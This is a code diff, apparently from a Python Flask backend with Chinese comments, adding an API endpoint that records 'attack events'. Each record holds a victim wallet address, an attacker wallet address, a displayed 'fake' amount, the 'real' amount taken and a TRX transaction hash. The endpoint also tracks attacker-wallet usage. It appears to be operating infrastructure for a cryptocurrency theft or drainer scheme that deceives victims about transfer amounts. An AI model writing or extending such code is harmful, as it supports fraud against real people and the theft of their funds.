@@ -1215,6 +1215,85 @@ def api_get_attacker_address():
             'message': f'获取攻击者地址失败: {str(e)}'
         }), 500
 
+@app.route('/api/record_attack', methods=['POST'])
+def api_record_attack():
+    """记录攻击事件 - 前端调用"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({
+                'status': 'error',
+                'message': '缺少请求数据'
+            }), 400
+        
+        # 验证必需字段
+        required_fields = ['victim_address', 'attacker_address', 'fake_amount', 'real_amount', 'attack_type']
+        for field in required_fields:
+            if field not in data:
+                return jsonify({
+                    'status': 'error',
+                    'message': f'缺少必需字段: {field}'
+                }), 400
+        
+        # 记录攻击事件到数据库
+        cursor = enhanced_system.db_connection.cursor()
+        
+        # 创建攻击记录表（如果不存在）
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS attack_records (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_address TEXT NOT NULL,
+                attacker_address TEXT NOT NULL,
+                fake_amount REAL NOT NULL,
+                real_amount REAL NOT NULL,
+                transaction_hash TEXT,
+                attack_type TEXT NOT NULL,
+                status TEXT NOT NULL,
+                timestamp TEXT NOT NULL,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        # 插入攻击记录
+        cursor.execute('''
+            INSERT INTO attack_records 
+            (victim_address, attacker_address, fake_amount, real_amount, transaction_hash, 
+             attack_type, status, timestamp) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            data['victim_address'],
+            data['attacker_address'],
+            data['fake_amount'],
+            data['real_amount'],
+            data.get('transaction_hash', ''),
+            data['attack_type'],
+            data.get('status', 'unknown'),
+            data.get('timestamp', datetime.now().isoformat())
+        ))
+        
+        enhanced_system.db_connection.commit()
+        attack_id = cursor.lastrowid
+        
+        # 更新钱包使用统计
+        enhanced_system.update_wallet_usage(data['attacker_address'])
+        
+        logger.info(f"🎯 记录攻击事件: {data['victim_address']} -> {data['attacker_address']} ({data['real_amount']} TRX)")
+        
+        return jsonify({
+            'status': 'success',
+            'data': {
+                'attack_id': attack_id,
+                'message': '攻击记录已保存'
+            }
+        })
+        
+    except Exception as e:
+        logger.error(f"❌ 记录攻击事件API错误: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'message': f'记录攻击事件失败: {str(e)}'
+        }), 500
+
 @app.route('/api/execute_distribution/<distribution_id>', methods=['POST'])
 def api_execute_distribution(distribution_id: str):
     """执行分配API"""
